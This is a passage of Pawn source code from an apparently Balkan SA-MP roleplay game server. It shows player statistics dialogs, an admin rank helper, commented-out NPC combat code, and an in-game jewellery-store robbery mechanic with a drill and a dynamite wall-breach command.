        new year, month,day, tmphour, tmpminute, tmpsecond;
        getdate( year, month, day );
        gettimeEx( tmphour, tmpminute, tmpsecond );
        FixHour( tmphour );
        tmphour = shifthour;
        format( str, sizeof( str ), "                   %02d/%02d/%d - %s%d:%s%d:%s%d", day, month, year, (tmphour < 10) ? ("0") : (""), tmphour, (tmpminute < 10) ? ("0") : (""), tmpminute, (tmpsecond < 10) ? ("0") : (""), tmpsecond );
        strcat( DialogStrgEx, str );

        ShowPlayerDialog( playerid, dialog_Stats_2Check, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "Nazad" );
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
    }
}

ShowDialogStatsCheck(playerid, targetid) {

    ProveraIgraca[playerid] = targetid;

    if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) )
    {
        new pol[ 7 ], str[ 1024 ], drzava[ 32 ];

        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

        strcat( DialogStrgEx, "{FFFFFF}** Licna karta:\n" );

        if( PlayerInfo[ targetid ][ xPol ] == 1 ) pol = "Musko";
        else if( PlayerInfo[ targetid ][ xPol ] == 2 ) pol = "Zensko";

        switch( PlayerInfo[ targetid ][ xDrzava ] )
        {
            case 1: { drzava = "Makedonija"; }
            case 2: { drzava = "Hrvatska"; }
            case 3: { drzava = "Srbija"; }
            case 4: { drzava = "Montenegro"; }
            case 5: { drzava = "Bosna i Hercegovina"; }
            case 6: { drzava = "Other"; }
        }

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Ime i prezime: {FFFFFF}[%s]\n"SRVBOJA1SCM"Pol: {FFFFFF}[%s]\n"SRVBOJA1SCM"Godine: {FFFFFF}[%d]\n"SRVBOJA1SCM"Drzava: {FFFFFF}[%s]\n\n",
                ImeIgraca( targetid ),
                pol,
                PlayerInfo[ targetid ][ xGodine ],
                drzava );
        strcat( DialogStrgEx, str );
        
        strcat( DialogStrgEx, "{FFFFFF}** Posao:\n" );
        if(PlayerInfo[playerid][xPosao] == POSAO_DILER) {
            format(globalstring, sizeof(globalstring), ""SRVBOJA1SCM"Ubrana droga: {FFFFFF}[%dg]\n"SRVBOJA1SCM"Preradjena Droga: {FFFFFF}[%dg]\n", PlayerInfo[playerid][xNeoDroga], PlayerInfo[playerid][xDrogaPosao]);
            strcat(DialogStrgEx, globalstring);
        }
        format( globalstring, sizeof( globalstring ),
            ""SRVBOJA1SCM"Ime: {FFFFFF}[%s]\n"SRVBOJA1SCM"Ugovor: {FFFFFF}[%d/1]\n"SRVBOJA1SCM"Job Skill: {FFFFFF}[%d/5]\n\n", getJobName( PlayerInfo[ targetid ][ xPosao ] ), PlayerInfo[ targetid ][ xUgovor ], PlayerInfo[targetid][xJobSkill] );
        strcat( DialogStrgEx, globalstring );
        
        strcat( DialogStrgEx, "{FFFFFF}** Organizacija:\n" );
        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Ime: {FFFFFF}[%s]\n"SRVBOJA1SCM"Rank: {FFFFFF}[%s]\n"SRVBOJA1SCM"Vreme u org: {FFFFFF}[%dh]\n"SRVBOJA1SCM"Kazneni ugovor: {FFFFFF}[%dh]\n\n",
                getOrgName( PlayerInfo[ targetid ][ xClan ] ),
                getOrgRank( targetid, PlayerInfo[ targetid ][ xClan ] ),
                PlayerInfo[ targetid ][ xOrgUgovor ],
                PlayerInfo[ targetid ][ xKazneniUgovor ]  );
        strcat( DialogStrgEx, str );

        strcat( DialogStrgEx, "{FFFFFF}** Novcano stanje:\n" );
        format( str, sizeof( str ), ""SRVBOJA1SCM"Dzep: {FFFFFF}[%d$]\n"SRVBOJA1SCM"Banka: {FFFFFF}[%d$]\n"SRVBOJA1SCM"Zlato: {FFFFFF}[%dg]\n"SRVBOJA1SCM"Prljavi Novac: {FFFFFF}[%d$]\n"SRVBOJA1SCM"Bitcoin: {FFFFFF}[%dbtc]\n"SRVBOJA1SCM"Plata: {FFFFFF}[%d$]\n\n",
            PlayerInfo[ targetid ][ xNovac ],
            PlayerInfo[ targetid ][ xBRacun ],
            PlayerInfo[ targetid ][ xZlato ],
            PlayerInfo[targetid][xPrljavNovac],
            PlayerInfo[targetid][xBitcoin],
            PlayerInfo[targetid][xPlatniRacun]  );
        strcat( DialogStrgEx, str );

        new nxtlevel = PlayerInfo[ targetid ][ xLevel ]+1,
            expamount = nxtlevel*levelexp,
            exp = PlayerInfo[ targetid ][ xRespekt ];

        strcat( DialogStrgEx, "{FFFFFF}** Opste informacije:\n" );
        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Level: {FFFFFF}[%d]\n"SRVBOJA1SCM"Sati igranja: {FFFFFF}[%d]\n"SRVBOJA1SCM"Respekti: {FFFFFF}[%d/%d]\n"SRVBOJA1SCM"Spawn Health: {FFFFFF}[%.2f]\n\
            "SRVBOJA1SCM"Admin: {FFFFFF}[%s(A:%d)]\n"SRVBOJA1SCM"Test Admin: {FFFFFF}[%s]\n"SRVBOJA1SCM"Helper: {FFFFFF}[%d]\n"SRVBOJA1SCM"Promoter: {FFFFFF}[%d]\n"SRVBOJA1SCM"VIP: {FFFFFF}[%d]\n"SRVBOJA1SCM"VIP Preostalo: {FFFFFF}[%d minuta]\n"SRVBOJA1SCM"Vreme do plate: {FFFFFF}[%d min]\n",
                PlayerInfo[ targetid ][ xLevel ],
                PlayerInfo[ targetid ][ xOnlineSati ],
                exp,
                expamount,
                (50+PlayerInfo[ targetid ][ xSHealth ]),
                getAdminRankName( targetid ), PlayerInfo[targetid][xAdmin],
                ((PlayerInfo[ targetid ][ xSpecAdmin ]) ? ("Da") : ("Ne")),
                PlayerInfo[ targetid ][ xSupporter ],
                PlayerInfo[ targetid ][ xPromoter ],
                PlayerInfo[ targetid ][ xVIPLevel ],
                PlayerInfo[targetid][xVIPVreme],
                (60-PlayerInfo[ targetid ][ xPayDay ]) );
        strcat( DialogStrgEx, str );

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Telefon: {FFFFFF}%d\n"SRVBOJA1SCM"Uhapsen: {FFFFFF}%d\n"SRVBOJA1SCM"Brak: {FFFFFF}%s\n"SRVBOJA1SCM"Materijali: {FFFFFF}%d\n"SRVBOJA1SCM"Upozorenja {FFFFFF}[%d/5]\n"SRVBOJA1SCM"Case Keys {FFFFFF}%d\n",
                PlayerInfo[ targetid ][ xBrojTelefona ],
                PlayerInfo[ targetid ][ xUhapsen ],
                PlayerInfo[ targetid ][ xMarriedTo ],
                PlayerInfo[ targetid ][ xMaterijali ],
                PlayerInfo[ targetid ][ xWarn ],
                PlayerInfo[targetid][xKey]);

        strcat( DialogStrgEx, str );

        new year, month,day, tmphour, tmpminute, tmpsecond;
        getdate( year, month, day );
        gettimeEx( tmphour, tmpminute, tmpsecond );
        FixHour( tmphour );
        tmphour = shifthour;
        format( str, sizeof( str ), "                   %02d/%02d/%d - %s%d:%s%d:%s%d", day, month, year, (tmphour < 10) ? ("0") : (""), tmphour, (tmpminute < 10) ? ("0") : (""), tmpminute, (tmpsecond < 10) ? ("0") : (""), tmpsecond );
        strcat( DialogStrgEx, str );

        ShowPlayerDialog( playerid, dialog_StatsCheck, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "Imovina", "Izadji" );
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
    }

    return 1;
}

ShowDialogStats( playerid, targetid )
{
    if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) )
    {
        new pol[ 7 ], str[ 1024 ], drzava[ 32 ];

        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

        strcat( DialogStrgEx, "{FFFFFF}** Licna karta:\n" );

        if( PlayerInfo[ targetid ][ xPol ] == 1 ) pol = "Musko";
        else if( PlayerInfo[ targetid ][ xPol ] == 2 ) pol = "Zensko";

        switch( PlayerInfo[ targetid ][ xDrzava ] )
        {
            case 1: { drzava = "Makedonija"; }
            case 2: { drzava = "Hrvatska"; }
            case 3: { drzava = "Srbija"; }
            case 4: { drzava = "Montenegro"; }
            case 5: { drzava = "Bosna i Hercegovina"; }
            case 6: { drzava = "Other"; }
        }

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Ime i prezime: {FFFFFF}[%s]\n"SRVBOJA1SCM"Pol: {FFFFFF}[%s]\n"SRVBOJA1SCM"Godine: {FFFFFF}[%d]\n"SRVBOJA1SCM"Drzava: {FFFFFF}[%s]\n\n",
                ImeIgraca( targetid ),
                pol,
                PlayerInfo[ targetid ][ xGodine ],
                drzava );
        strcat( DialogStrgEx, str );
        
        strcat( DialogStrgEx, "{FFFFFF}** Posao:\n" );
        if(PlayerInfo[playerid][xPosao] == POSAO_DILER) {
            format(globalstring, sizeof(globalstring), ""SRVBOJA1SCM"Ubrana droga: {FFFFFF}[%dg]\n"SRVBOJA1SCM"Preradjena Droga: {FFFFFF}[%dg]\n", PlayerInfo[playerid][xNeoDroga], PlayerInfo[playerid][xDrogaPosao]);
            strcat(DialogStrgEx, globalstring);
        }
        format( globalstring, sizeof( globalstring ),
            ""SRVBOJA1SCM"Ime: {FFFFFF}[%s]\n"SRVBOJA1SCM"Ugovor: {FFFFFF}[%d/1]\n"SRVBOJA1SCM"Job Skill: {FFFFFF}[%d/5]\n\n", getJobName( PlayerInfo[ targetid ][ xPosao ] ), PlayerInfo[ targetid ][ xUgovor ], PlayerInfo[targetid][xJobSkill] );
        strcat( DialogStrgEx, globalstring );
        
        strcat( DialogStrgEx, "{FFFFFF}** Organizacija:\n" );
        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Ime: {FFFFFF}[%s]\n"SRVBOJA1SCM"Rank: {FFFFFF}[%s]\n"SRVBOJA1SCM"Vreme u org: {FFFFFF}[%dh]\n"SRVBOJA1SCM"Kazneni ugovor: {FFFFFF}[%dh]\n\n",
                getOrgName( PlayerInfo[ targetid ][ xClan ] ),
                getOrgRank( targetid, PlayerInfo[ targetid ][ xClan ] ),
                PlayerInfo[ targetid ][ xOrgUgovor ],
                PlayerInfo[ targetid ][ xKazneniUgovor ]  );
        strcat( DialogStrgEx, str );

        strcat( DialogStrgEx, "{FFFFFF}** Novcano stanje:\n" );
        format( str, sizeof( str ), ""SRVBOJA1SCM"Dzep: {FFFFFF}[%d$]\n"SRVBOJA1SCM"Banka: {FFFFFF}[%d$]\n"SRVBOJA1SCM"Zlato: {FFFFFF}[%dg]\n"SRVBOJA1SCM"Prljavi Novac: {FFFFFF}[%d$]\n"SRVBOJA1SCM"Bitcoin: {FFFFFF}[%dbtc]\n"SRVBOJA1SCM"Plata: {FFFFFF}[%d$]\n\n",
            PlayerInfo[ targetid ][ xNovac ],
            PlayerInfo[ targetid ][ xBRacun ],
            PlayerInfo[ targetid ][ xZlato ],
            PlayerInfo[targetid][xPrljavNovac],
            PlayerInfo[targetid][xBitcoin],
            PlayerInfo[targetid][xPlatniRacun]  );
        strcat( DialogStrgEx, str );

        new nxtlevel = PlayerInfo[ targetid ][ xLevel ]+1,
            expamount = nxtlevel*levelexp,
            exp = PlayerInfo[ targetid ][ xRespekt ];

        strcat( DialogStrgEx, "{FFFFFF}** Opste informacije:\n" );
        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Level: {FFFFFF}[%d]\n"SRVBOJA1SCM"Sati igranja: {FFFFFF}[%d]\n"SRVBOJA1SCM"Respekti: {FFFFFF}[%d/%d]\n"SRVBOJA1SCM"Spawn Health: {FFFFFF}[%.2f]\n\
            "SRVBOJA1SCM"Admin: {FFFFFF}[%s(A:%d)]\n"SRVBOJA1SCM"Test Admin: {FFFFFF}[%s]\n"SRVBOJA1SCM"Helper: {FFFFFF}[%d]\n"SRVBOJA1SCM"Promoter: {FFFFFF}[%d]\n"SRVBOJA1SCM"VIP: {FFFFFF}[%d]\n"SRVBOJA1SCM"VIP Preostalo: {FFFFFF}[%d minuta]\n"SRVBOJA1SCM"Vreme do plate: {FFFFFF}[%d min]\n",
                PlayerInfo[ targetid ][ xLevel ],
                PlayerInfo[ targetid ][ xOnlineSati ],
                exp,
                expamount,
                (50+PlayerInfo[ targetid ][ xSHealth ]),
                getAdminRankName( targetid ), PlayerInfo[targetid][xAdmin],
                ((PlayerInfo[ targetid ][ xSpecAdmin ]) ? ("Da") : ("Ne")),
                PlayerInfo[ targetid ][ xSupporter ],
                PlayerInfo[ targetid ][ xPromoter ],
                PlayerInfo[ targetid ][ xVIPLevel ],
                PlayerInfo[targetid][xVIPVreme],
                (60-PlayerInfo[ targetid ][ xPayDay ]) );
        strcat( DialogStrgEx, str );

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Telefon: {FFFFFF}%d\n"SRVBOJA1SCM"Uhapsen: {FFFFFF}%d\n"SRVBOJA1SCM"Brak: {FFFFFF}%s\n"SRVBOJA1SCM"Materijali: {FFFFFF}%d\n"SRVBOJA1SCM"Upozorenja {FFFFFF}[%d/5]\n"SRVBOJA1SCM"Case Keys {FFFFFF}[%d]\n",
                PlayerInfo[ targetid ][ xBrojTelefona ],
                PlayerInfo[ targetid ][ xUhapsen ],
                PlayerInfo[ targetid ][ xMarriedTo ],
                PlayerInfo[ targetid ][ xMaterijali ],
                PlayerInfo[ targetid ][ xWarn ],
                PlayerInfo[targetid][xKey]);

        strcat( DialogStrgEx, str );

        new year, month,day, tmphour, tmpminute, tmpsecond;
        getdate( year, month, day );
        gettimeEx( tmphour, tmpminute, tmpsecond );
        FixHour( tmphour );
        tmphour = shifthour;
        format( str, sizeof( str ), "                   %02d/%02d/%d - %s%d:%s%d:%s%d", day, month, year, (tmphour < 10) ? ("0") : (""), tmphour, (tmpminute < 10) ? ("0") : (""), tmpminute, (tmpsecond < 10) ? ("0") : (""), tmpsecond );
        strcat( DialogStrgEx, str );

        ShowPlayerDialog( playerid, dialog_Stats, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "Imovina", "Izadji" );
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
    }
    return 1;
}

ShowImovinaStats( playerid, targetid )
{
    if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) )
    {

        new str[1024];

        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

        strcat( DialogStrgEx, "{FFFFFF}** Statistika Imovine:\n\n" );

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Kljuc Imovine 1: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Imovine 2: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Imovine 3: {FFFFFF}[%d]\n\n",
                PlayerInfo[ targetid ][ xProperty ][ 0 ], PlayerInfo[ targetid ][ xProperty ][ 1 ], PlayerInfo[ targetid ][ xProperty ][ 2 ]);
        strcat( DialogStrgEx, str );

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Kljuc Firme: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Vozila 1: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Vozila 2: {FFFFFF}[%d]\n\n",
                PlayerInfo[ targetid ][ xFirmaID ], PlayerInfo[ targetid ][ xVoziloID ][ 0 ], PlayerInfo[ targetid ][ xVoziloID ][ 1 ]);
        strcat( DialogStrgEx, str );

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Kljuc Vozila 3: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Vozila 4: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Garaze: {FFFFFF}[%d]\n\n",
                PlayerInfo[ targetid ][ xVoziloID ][ 2 ], PlayerInfo[ targetid ][ xVoziloID ][ 3 ], PlayerInfo[ targetid ][ xGarageID ]);
        strcat( DialogStrgEx, str );

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Kljuc Radionice: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Bitcoin Workshopa: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Naftne Platforme: {FFFFFF}[%d]\n\n",
                PlayerInfo[targetid][xWorkShopGarage], PlayerInfo[targetid][xWorkShopID], PlayerInfo[targetid][xNaftaID]);
        strcat( DialogStrgEx, str );

        new year, month,day, tmphour, tmpminute, tmpsecond;
        getdate( year, month, day );
        gettimeEx( tmphour, tmpminute, tmpsecond );
        FixHour( tmphour );
        tmphour = shifthour;
        format( str, sizeof( str ), "                   %02d/%02d/%d - %s%d:%s%d:%s%d", day, month, year, (tmphour < 10) ? ("0") : (""), tmphour, (tmpminute < 10) ? ("0") : (""), tmpminute, (tmpsecond < 10) ? ("0") : (""), tmpsecond );
        strcat( DialogStrgEx, str );

        ShowPlayerDialog( playerid, dialog_Stats_2, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "Nazad" );
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
    }
}

CMD:stats( playerid )
{
    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes dok si u vozilu." );
    ShowDialogStats( playerid, playerid );
    return(true);
}

getAdminRankName( playerid )
{
    new admin_rank[20];

    if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 ) admin_rank = "Skripter";
    else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 ) admin_rank = "Founder";
    else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) admin_rank = "Mapper";
    else if( PlayerInfo[ playerid ][ xSpecAdmin ] == 1 ) admin_rank = "Test Admin";
    else
    {
        switch( PlayerInfo[ playerid ][ xAdmin ] )
        {
            case 0: admin_rank = "Nema";
            case 1: admin_rank = "Administrator";
            case 2: admin_rank = "Administrator";
            case 3: admin_rank = "Administrator";
            case 4: admin_rank = "Administrator";
            case 5: admin_rank = "Head Admin";
            case 6: admin_rank = "Suvlasnik";
            case 7: admin_rank = "Vlasnik";
        }
    }
    return admin_rank;
}

// public FCNPC_OnTakeDamage(npcid, issuerid, Float:amount, weaponid, bodypart) {

//     if(npcid == EnemyActor1) {

//         if(!UpucajNeprijatelja1{issuerid}) return 0;
//         if(UbioActora2{issuerid}) return 0;
//         new Float:Pos[3];
//         FCNPC_GetPosition(EnemyActor1, Pos[0], Pos[1], Pos[2]);
//         if(IsPlayerInRangeOfPoint(issuerid, 40.0, Pos[0], Pos[1], Pos[2])) {

//             FCNPC_AimAtPlayer(EnemyActor1, issuerid, true, -1, true, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
//             defer TimerPucanje1(issuerid);
//         } else FCNPC_StopAim(EnemyActor1);
//         return 1;
//     }
//     if(npcid == EnemyActor2) {

//         if(!UpucajNeprijatelja2{issuerid}) return 0;
//         if(UbioActora3{issuerid}) return 0;
//         new Float:Pos[3];
//         FCNPC_GetPosition(EnemyActor2, Pos[0], Pos[1], Pos[2]);
//         if(IsPlayerInRangeOfPoint(issuerid, 40.0, Pos[0], Pos[1], Pos[2])) {

//             FCNPC_AimAtPlayer(EnemyActor2, issuerid, true, -1, true, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
//             defer TimerPucanje2(issuerid);
//         } else FCNPC_StopAim(EnemyActor2);
//         return 1;
//     }
//     // if(npcid == ZlataraCuvar) {

//     //     if( GetFactionType( issuerid ) != ORG_TIP_BANDA && GetFactionType(issuerid) != ORG_TIP_MAFIJA ) return 0;
//     //     if(ZlataraOrobana) return 0;
//     //     if(ZlataraRobUToku) return 0;
//     //     FCNPC_AimAtPlayer(ZlataraCuvar, issuerid, true, -1, true, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
//     //     defer ZlataraPucaTimer(issuerid);
//     //     return 1;
//     // }
//     // if(npcid == PandurNPC) {

//     //     if(!MichaelMisija1CP2[issuerid]) return 0;
//     //     FCNPC_AimAtPlayer(PandurNPC, issuerid, true, -1, true, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
//     //     defer PandurPucaTimer(issuerid);
//     //     return 1;
//     // }
//     return 1;
// }

// public FCNPC_OnDeath(npcid, killerid, reason) {

//     if(npcid == EnemyActor1) {

//         if(!UpucajNeprijatelja1{killerid}) return 0;
//         if(!RadiVojnik{killerid}) return 0;
//         if(UbioActora2{killerid}) return 0;
//         UpucajNeprijatelja1{killerid} = true;
//         FCNPC_ApplyAnimation(EnemyActor1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
//         Novi_SetPlayerCheckpoint(killerid, 214.5136,1864.1028,13.1406, 2.0);
//         VojnikMisijaJedanCP{killerid}++;
//         UbioActora2{killerid} = true;
//         UpucajNeprijatelja1{killerid} = false;
//         defer VratiNpcAnim1();
//         return 1;
//     }
//     if(npcid == EnemyActor2) {

//         if(!UpucajNeprijatelja2{killerid}) return 0;
//         if(!RadiVojnik{killerid}) return 0;
//         if(UbioActora3{killerid}) return 0;
//         FCNPC_ApplyAnimation(EnemyActor2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
//         Novi_SetPlayerCheckpoint(killerid, 254.5709,1826.2524,7.5547, 2.0);
//         VojnikMisijaJedanCP{killerid}++;
//         UbioActora3{killerid} = true;
//         UpucajNeprijatelja2{killerid} = false;
//         defer VratiNpcAnim2();
//         return 1;
//     }
//     // if(npcid == ZlataraCuvar) {

//     //     SendInfoMessage(killerid, "Pokrenu si rob zlatare! Postavi busilicu ispred sefa koristeci tipku N");
//     //     SendInfoMessage(killerid, "Ne smes da napustis zlataru inace ce se rob prekinuti!");
//     //     ZlataraRobUToku = true;
//     //     RobaZlataru[killerid] = true;
//     //     PostaviBusilicu[killerid] = true;

//     //     PostaviWanted(killerid, "Rob Zlatare", "Nepoznat", 10);
//     //     SendClientMessageToAll(0xFF0000FF, "(ZLATARA ROB) "col_white"Obavestavamo gradjane da se upravo odvija pljacka zlatare!");
//     //     foreach( Player, i ) {
//     //         if( IsPlayerConnected( i ) ) {
//     //             if( OI[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_PD ) {
//     //                 SCM( i, 0x8D8DFF00, "Cuvar u zlatari je ubijen! Sve jedinice na lice mesta!" );
//     //             }
//     //         }
//     //     }

//     //     return 1;
//     // }
//     // if(npcid == PandurNPC) {

//     //     Novi_DisablePlayerCheckpoint(killerid);
//     //     MichaelMisija1CP2[killerid] = false;
//     //     MichaelMisija1CP3[killerid] = true;
//     //     Novi_SetPlayerCheckpoint(killerid, 2012.1278,-1763.7977,17.3444, 2.0);
//     //     SendInfoMessage(killerid, "Uspesno si ubio pandura! Vrati se kod Michaela da bi dobio novac!");
//     //     defer VratiNpcAnim3();
//     //     return 1;
//     // }
//     return 1;
// }

// timer VratiNpcAnim1[10000]() {

//     FCNPC_Respawn(EnemyActor1);
//     FCNPC_StopAim(EnemyActor1);
//     return 1;
// }

// timer VratiNpcAnim2[10000]() {

//     FCNPC_Respawn(EnemyActor2);
//     FCNPC_StopAim(EnemyActor2);
//     return 1;
// }

// timer VratiNpcAnim3[10000]() {

//     FCNPC_Respawn(PandurNPC);
//     FCNPC_StopAim(PandurNPC);
//     return 1;
// }

// timer TimerPucanje1[5000](issuerid) {

//     new Float:Pos[3];
//     GetPlayerPos(EnemyActor1, Pos[0], Pos[1], Pos[2]);
//     if(IsPlayerInRangeOfPoint(issuerid, 30.0, Pos[0], Pos[1], Pos[2])) {

//         FCNPC_AimAtPlayer(EnemyActor1, issuerid, true, -1, true, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
//         defer TimerPucanje1(issuerid);
//     } else FCNPC_StopAim(EnemyActor1);

//     return 1;
// }

// timer TimerPucanje2[5000](issuerid) {

//     new Float:Pos[3];
//     GetPlayerPos(EnemyActor2, Pos[0], Pos[1], Pos[2]);
//     if(IsPlayerInRangeOfPoint(issuerid, 30.0, Pos[0], Pos[1], Pos[2])) {

//         FCNPC_AimAtPlayer(EnemyActor2, issuerid, true, -1, true, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
//         defer TimerPucanje1(issuerid);
//     } else FCNPC_StopAim(EnemyActor2);

//     return 1;
// }

// timer ZlataraPucaTimer[5000](issuerid) {

//     new Float:Pos[3];
//     GetPlayerPos(ZlataraCuvar, Pos[0], Pos[1], Pos[2]);
//     if(IsPlayerInRangeOfPoint(issuerid, 30.0, Pos[0], Pos[1], Pos[2])) {

//         FCNPC_AimAtPlayer(ZlataraCuvar, issuerid, true, -1, true, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
//         defer ZlataraPucaTimer(issuerid);
//     } else FCNPC_StopAim(ZlataraCuvar);

//     return 1;
// }

KreirajBusilicuZlatara() {

    BusilicaZlatara[0] = CreateDynamicObject(18717,1109.412,-1674.633,13.811,0.000,-86.199,-1.099,-1,-1,-1,150.000,150.000);
    BusilicaZlatara[1] = CreateDynamicObject(18655,1107.601,-1674.604,13.924,176.300,0.000,0.000,-1,-1,-1,150.000,150.000);
    SetDynamicObjectMaterial(BusilicaZlatara[1], 0, 10101, "2notherbuildsfe", "Bow_Abpave_Gen", 0x00000000);
    BusilicaZlatara[2] = CreateDynamicObject(18655,1107.601,-1674.604,13.924,176.300,0.000,0.000,-1,-1,-1,150.000,150.000);
    SetDynamicObjectMaterial(BusilicaZlatara[2], 0, 10101, "2notherbuildsfe", "Bow_Abpave_Gen", 0x00000000);
    BusilicaZlatara[3] = CreateDynamicObject(2006,1107.704,-1674.612,13.924,0.000,0.000,90.199,-1,-1,-1,150.000,150.000);
    SetDynamicObjectMaterial(BusilicaZlatara[3], 0, 18996, "mattextures", "sampblack", 0x00000000);
    BusilicaZlatara[4] = CreateDynamicObject(2006,1107.614,-1674.612,13.924,0.000,0.000,90.199,-1,-1,-1,150.000,150.000);
    SetDynamicObjectMaterial(BusilicaZlatara[4], 0, 18996, "mattextures", "sampblack", 0x00000000);
    BusilicaZlatara[5] = CreateDynamicObject(2006,1107.534,-1674.612,13.924,0.000,0.000,90.199,-1,-1,-1,150.000,150.000);
    SetDynamicObjectMaterial(BusilicaZlatara[5], 0, 18996, "mattextures", "sampblack", 0x00000000);
    BusilicaZlatara[6] = CreateDynamicObject(19610,1107.813,-1674.600,13.925,0.000,0.000,-90.700,-1,-1,-1,150.000,150.000);
}

UnistiBusilicuZlatara() {

    for(new i = 0; i < 7; i++) {

        DestroyDynamicObject(BusilicaZlatara[i]);
    }
}

UnistiZlataraVrata() {

    DestroyDynamicObject(ZlataraSef);
    DestroyDynamicObject(ZlataraSef2);
}

timer BusilicaTimerZlatara[1000](playerid) {

    if(BusilicaTimeZlatara[playerid] != 0) {

        va_GameTextForPlayer(playerid, "%d sekundi", 1000, 3, BusilicaTimeZlatara[playerid]);
        BusilicaTimeZlatara[playerid]--;
        TimerRobZlatara = defer BusilicaTimerZlatara(playerid);
        return 1;

    } else {

        UnistiBusilicuZlatara();
        UnistiZlataraVrata();
        PokupiTorbuZlatara[playerid] = true;
        SendInfoMessage(playerid, "Pokupi novac sa stola pritiskom na N");
        return 1;
    }
}

timer SledeciRobZlatare[21600000]() {

    DestroyDynamicObject(ZlataraSef);
    DestroyDynamicObject(ZlataraSef2);
    DestroyDynamicObject(ZidZlatara);

    ZlataraOrobana = false;
    ZlataraZidProbijen = false;

    ZlataraSef = CreateDynamicObject(19462,1108.269,-1675.543,11.984,-90.000,0.000,0.000,-1,-1,-1,50.000,50.000);
    SetDynamicObjectMaterial(ZlataraSef, 0, 9525, "boigas_sfw", "GEwhite1_64", 0x00000000);

    ZlataraSef2 = CreateDynamicObject(18886,1107.312,-1675.508,14.565,-90.000,-90.000,0.000,-1,-1,-1,50.000,50.000);
    SetDynamicObjectMaterial(ZlataraSef2, 0, 10101, "2notherbuildsfe", "ferry_build14", 0x00000000);
    SetDynamicObjectMaterial(ZlataraSef2, 1, 18996, "mattextures", "sampblack", 0x00000000);

    ZidZlatara = CreateDynamicObject(19462,1118.961,-1677.724,10.354,-90.000,0.000,0.000,-1,-1,-1,50.000,50.000);
    SetDynamicObjectMaterial(ZidZlatara, 0, 10765, "airportgnd_sfse", "white", 0x00000000);

    ZlataraCuvarUpucan = false;
    //FCNPC_Respawn(ZlataraCuvar);
    return 1;
}

CMD:probijzid(playerid)
{
    if(!IsPlayerInRangeOfPoint(playerid, 3.0, 1118.1024,-1677.7117,13.5349)) return SendErrorMessage(playerid, "Nisi kod zida!");
    if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA) return SendErrorMessage(playerid, "Samo mafija/banda!");
    if(ZlataraZidProbijen) return SendErrorMessage(playerid, "Zid je vec probijen!");
    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
        SendErrorMessage( playerid, "PD/FBI/CIA nema razloga koristiti ovo!");
        return 1;
    }
    if(PlayerInfo[playerid][xDinamit] == 0) return SendErrorMessage(playerid, "Nemas dinamit!");
    defer EksplozijaZlatara(playerid);
    PlayerInfo[playerid][xDinamit]--;
    SendInfoMessage(playerid, "Postavio si dinamit, odmakni se!");
    //CreateExplosion(Float:X, Float:Y, Float:Z, 12, 2.0)
    return 1;
}

timer EksplozijaZlatara[5000](playerid) {

    CreateExplosion( 1118.1024,-1677.7117,13.5349, 12, 2.0);
    DestroyDynamicObject(ZidZlatara);
    ZlataraZidProbijen = true;
    SendInfoMessage(playerid, "Uspesno si razneo zid zlatare!");

    return 1;
}

CMD:predajkombi(playerid) {

    if( GetFactionType( playerid ) != ORG_TIP_BANDA && GetFactionType(playerid) != ORG_TIP_MAFIJA ) return SendErrorMessage(playerid, "Moras biti clan bande/mafije!");
    if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");
    if(GetPlayerVehicleID(playerid) != KombiHangar) return SendErrorMessage(playerid, "Moras biti u kombiju iz hangara!");

